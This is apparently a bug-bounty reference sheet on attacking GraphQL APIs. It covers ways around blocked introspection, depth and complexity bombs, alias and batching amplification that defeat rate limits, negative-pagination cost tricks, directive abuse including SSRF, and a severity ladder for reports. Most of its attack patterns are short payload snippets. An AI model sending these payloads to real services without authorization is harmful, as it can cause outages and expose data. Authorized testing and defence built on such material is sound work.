# GraphQL — Depth / Cost / Batching Abuse Matrix

Companion to `hunt-graphql`. That file covers introspection, field-level authz, APQ, id-harvest,
and mutation IDOR in depth. This file is the **resource-abuse + introspection-bypass** matrix —
the two edges the main skill touches only lightly.

## 1. Introspection bypass ladder (when `__schema` is blocked)

```
rung 1  __typename / { __type(name:"User"){ fields{name} } }    partial introspection per type
rung 2  field-suggestion error:  { userX } -> "Did you mean user?"    enumerate field names
rung 3  alias the meta fields:  { s:__schema { t:types { n:name } } }   WAF keyword dodge
rung 4  clairvoyance wordlist brute (when suggestion is off)
rung 5  APQ: waymore/gau/wayback leak <Op>/<sha256> URLs -> harvest registered ops
rung 6  directive exploration: __schema { directives { name args } }   auth directives leak intent
```
Partial `__type(name:)` beats nothing and frequently survives when full `__schema` is off.

## 2. Depth / complexity attack matrix

```
# depth bomb — exponential object growth within the letter of the limit
query { a { b { c { d { ... 30 levels }}}}}
# fragment spread to bypass a DEPTH counter (counts fields, not fragment expansion)
fragment F on User { repos { teams { members { ...F } } } }
# alias amplification — N copies of the same expensive field in one request
query { f1:x f2:x f3:x ... f100:x }
# batching array — N operations in one HTTP POST (bypass per-request rate limit)
[ {query:"{ a }"}, {query:"{ a }"}, ... ]
# negative `first`/`last` → negative query-cost contribution (Shopify #481518)
query { products(first:-100) { ... } }
# deep attribute tree + sustained → origin OOM (EXNESS #2293642)
```

Compute the cost the way the server does (field × depth × alias count) and show you exceed the
advertised budget — a depth/complexity limit that isn't actually enforced is the finding.

## 3. Batching / alias — when it wins (from the main skill, restated as a matrix)

| resolver model | alias batching | parallel HTTP |
|---|---|---|
| concurrent (DataLoader async) | WINS (N× in 1 RTT) | also wins |
| single-threaded / 1-DB-conn | serial, 1st closes the door | WINS |
| federation (dispatched to subgraphs) | per-subgraph | per-subgraph |

Always measure: 10 aliased mutations → count successes. Then 10 parallel HTTP POSTs → count again.
The larger count is the exploit; report with the number, not "should be bypassable".

## 4. Directive / argument abuse

```
@skip(if:...) / @include(if:...)  — boolean oracle from response shape
@defer / @stream (if enabled)     — incremental leak / partial-mutation state
directive args carrying a URL      — SSRF (field arg, see EXNESS allTicks)
custom scalar coercing id/email    — type-confusion gate bypass
```

## 5. Escalation rung

```
rung 1  introspection on / schema dumped          → recon (not a finding alone)
rung 2  depth/complexity/batch limit unenforced    → Medium (DoS / rate-limit bypass)
rung 3  field-level authz missing (sibling leaked)  → High (paid-data exposure)
rung 4  mutation IDOR / admin mutation unauth        → Critical
```
Introspection and DoS are *enablers*; the field-level and mutation findings are what pay.